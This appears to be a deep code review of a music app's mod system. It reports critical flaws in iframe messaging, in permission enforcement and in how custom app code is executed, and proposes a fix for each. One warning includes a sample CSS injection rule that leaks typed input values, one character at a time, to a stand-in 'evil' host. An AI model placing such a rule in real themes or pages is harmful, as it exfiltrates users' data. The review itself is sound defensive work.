---
status: findings
phase: 5
phase_name: Mod System (Spicetify-parity)
depth: deep
files_reviewed: 18
critical: 3
warning: 4
info: 6
total: 13
---

# Code Review: Phase 5 — Mod System

**Depth:** deep | **Date:** 2026-06-21

## Summary

Reviewed 18 source files for the mod system (sandboxed extensions, themes, custom apps, manifest validation, persistence). Found 3 critical security issues (cross-origin message exposure, missing origin validation, no permission enforcement), 4 warnings (logic gaps), and 6 info items (code quality).

---

## Critical

### CR-1. postMessage target origin uses wildcard `*` across all channels

**File:** `src/mods/sandbox.ts:120,167,168,173,174,176,179,209`

All `postMessage` calls between the main thread and mod iframes use `'*'` as the target origin:

```ts
parent.postMessage({ type: "invoke", id: id, method: method, args: args }, "*");
// ...
iframe.contentWindow?.postMessage({ type: 'result', id: invoke.id, result: r }, '*');
iframe.contentWindow?.postMessage({ type: 'error', id: invoke.id, error: ... }, '*');
```

Since iframes are loaded via `srcdoc`, the origin is `null`, so `'*'` is the only option that works. However, any malicious child window (e.g., a compromised iframe or popup) can also send/receive messages.

**Fix:** Wrap messages in a unique channel token known only to the mod's iframe. Generate a per-mod session key and include it in every message. The handler on both sides should verify the token before processing.

---

### CR-2. MessageEvent origin is not validated in extension sandbox

**File:** `src/mods/sandbox.ts:159-190`

The `messageHandler` lambda checks `typeof msg !== 'object'` but never validates `event.origin`. Any cross-origin window (ad, tracker, compromised subresource) can inject invoke commands into the main thread's dispatcher.

```ts
const messageHandler = (event: MessageEvent<SandboxRequest | SandboxResponse>): void => {
  const msg = event.data;
  if (!msg || typeof msg !== 'object') return;
  if ('method' in msg && msg.type === 'invoke') {
    const fn = dispatcher[invoke.method];  // no origin check
```

**Fix:** Add `if (event.origin !== 'null') return;` since sandboxed `srcdoc` iframes always have `origin === 'null'`. Consider also wrapping with a per-session channel token (see CR-1).

---

### CR-3. Permission system declared but never enforced

**Files:** `src/mods/manifest.ts:14`, `src/mods/sandbox.ts:30-46`, `src/mods/apps.tsx:13-20`

Manifests declare a `permissions` field (e.g., `["player:play", "storage:get"]`), and the Rust backend parses and forwards it into `ModEntry.permissions`. However, `buildDispatcher` at `sandbox.ts:44` exposes **every** API method regardless of declared permissions:

```ts
walk(api as unknown as Record<string, unknown>, '');
// walks ALL methods — no filtering by permissions
```

Similarly, `createLitetifyAPI` in `apps.tsx:11` gives custom apps the full `LitetifyAPI` object without checking manifest permissions.

**Fix:** Pass `permissions` to `buildDispatcher` and filter the dispatch table: only register methods whose API path matches an allowed prefix. Implement a permission registry mapping API paths to required permission strings.

---

## Warnings

### WR-1. Sidebar item `icon` parameter silently dropped

**Files:** `src/mods/api.ts:22`, `src/App.tsx:68-71`

The `LitetifyAPI.ui.addSidebarItem` signature accepts `(id, label, icon)`, but the registration callback in `App.tsx` ignores the `icon` parameter:

```ts
setSidebarItemCallbacks(
  (id, label) => {
    useModsStore.getState().registerCustomView(id, label, () => null);
  },
```

The `icon` is lost. Mods that provide icons for their sidebar entries will not see them rendered.

**Fix:** Accept `icon` in the callback and store it in `customViews` metadata, or display a default icon for mod entries.

---

### WR-2. `new Function` in custom app loader runs mod code in main context

**File:** `src/mods/apps.tsx:25`

```ts
const fn = new Function(...keys, '"use strict";\n' + code + '\n//# sourceURL=mod://' + modId + '/' + mod.manifest.entry);
const result = fn(...vals);
```

Custom apps execute arbitrary mod code in the **main window context**, unlike extensions which run in sandboxed iframes. This means an app mod has full access to `window`, `document`, `localStorage`, and can exfiltrate auth tokens or modify any UI.

**Fix:** Run custom apps inside their own iframes (like extensions), using `postMessage` for API access. If iframe execution is infeasible, document this as a security boundary in SECURITY.md.

---

### WR-3. Theme CSS injection allows data exfiltration

**File:** `src/mods/themes.ts:24`

```ts
style.textContent = css;
```

Theme CSS is injected directly into `<head>`. A malicious theme can exfiltrate data via CSS selectors + `background-image: url(...)` (CSS injection attack). For example:

```css
input[value^="s"] { background: url(https://evil/?char=s); }
```

**Fix:** Sanitize the CSS to strip `url()` references, or serve themes through a CSP-restricted context. At minimum, document the risk in SECURITY.md.

---

### WR-4. `handleToggle` has unused parameter and relies on store re-read

**File:** `src/features/settings/Mods.tsx:19-22`

```ts
const handleToggle = useCallback((path: string, enabled: boolean) => {
  useModsStore.getState().toggleEnabled(path);
  persistEnabledState(path, enabled);
}, []);
```

The `enabled` parameter is passed from `e.target.checked` but `persistEnabledState` ignores it and re-reads from the store. The parameter is dead code. If the toggle logic ever changes (e.g., conditional toggle), the persisted state could desync from the store.

**Fix:** Remove the `enabled` parameter and rename to clarify the store is the source of truth. Or, invert the logic: compute `newEnabled = !store.registry.find(m => m.path === path)?.enabled` before persisting.

---

## Info

### INF-1. Module-level side effects in websdk.ts

**File:** `src/playback/websdk.ts:260`

`listenForEngineEvents()` is called at module scope, registering Tauri IPC listeners as soon as the module is imported. If the Web SDK engine is never used (e.g., user switches to librespot engine), these listeners still consume resources and could interfere.

**Fix:** Move the call into `ensurePlayer` or `connectToSDK` so listeners are registered only when the Web SDK is actually initialized.

---

### INF-2. Dynamic imports inside API factory create per-call chunks

**File:** `src/mods/api.ts:132,137`

```ts
async getPlaylists() {
  const { apiGetPlaylists } = await import('../lib/api');
  // ...
}
```

Each invocation performs a dynamic import. Build tools (Vite/webpack) will split this into a separate chunk loaded on first use, but repeated calls may re-trigger chunk loads.

**Fix:** Hoist the imports to module level, or cache the imported module reference.

---

### INF-3. `setSidebarItemCallbacks` wraps single callbacks in arrays unnecessarily

**File:** `src/mods/api.ts:57-63`

```ts
export function setSidebarItemCallbacks(
  addCb: (id: string, label: string, icon: string) => void,
  removeCb: (id: string) => void,
): void {
  sidebarItemCallbacks = [addCb];
  removeSidebarItemCallbacks = [removeCb];
}
```

The arrays `sidebarItemCallbacks` and `removeSidebarItemCallbacks` hold only one element. The module-level variables are typed as arrays but only set once from `App.tsx`. The `forEach` calls iterate over a single element.

**Fix:** Simplify to single callback variables instead of arrays.

---

### INF-4. `makePlayerAPI` recreates closures on every API creation

**File:** `src/mods/api.ts:86-127`

Each call to `createLitetifyAPI` creates a new `makePlayerAPI()` closure capturing the module-level `playbackEngine`. All mods share the same engine reference, but each gets its own closure object.

**Fix:** Create the player API once and share it across mod instances (the closures are functionally identical).

---

### INF-5. Unused `_enabled` parameter in `persistEnabledState`

**File:** `src/mods/loader.ts:117-121`

```ts
export function persistEnabledState(_path: string, _enabled: boolean): void {
  const store = useModsStore.getState();
  const enabledPaths = store.registry.filter((m) => m.enabled).map((m) => m.path);
  persistEnabled(enabledPaths);
}
```

Both parameters are unused. The function reads directly from the store, making the parameters misleading.

**Fix:** Remove parameters and update call sites.

---

### INF-6. Theme switching does not track previous theme mod

**File:** `src/mods/themes.ts:28-41`

```ts
export function activateTheme(name: string | null, registry: ModEntry[]): void {
  removeActiveTheme();
  // ...
  loadTheme(theme).catch(...)
}
```

`removeActiveTheme` removes any existing style tag by prefix, but there's no check that the to-be-loaded theme was previously disabled. If a mod is toggled off while its theme is active, the theme CSS remains applied.

**Fix:** On mod disable, check if the disabled mod owns the active theme and clear it.

---

## Files Reviewed

- `src-tauri/src/mods/mod.rs`
- `src-tauri/tauri.conf.json`
- `src/App.tsx`
- `src/app/Sidebar.tsx`
- `src/features/settings/Mods.tsx`
- `src/lib/api.ts`
- `src/lib/types.ts`
- `src/mods/api.ts`
- `src/mods/apps.tsx`
- `src/mods/components.tsx`
- `src/mods/index.ts`
- `src/mods/loader.ts`
- `src/mods/manifest.ts`
- `src/mods/sandbox.ts`
- `src/mods/store.ts`
- `src/mods/themes.ts`
- `src/playback/engine.ts`
- `src/playback/websdk.ts`
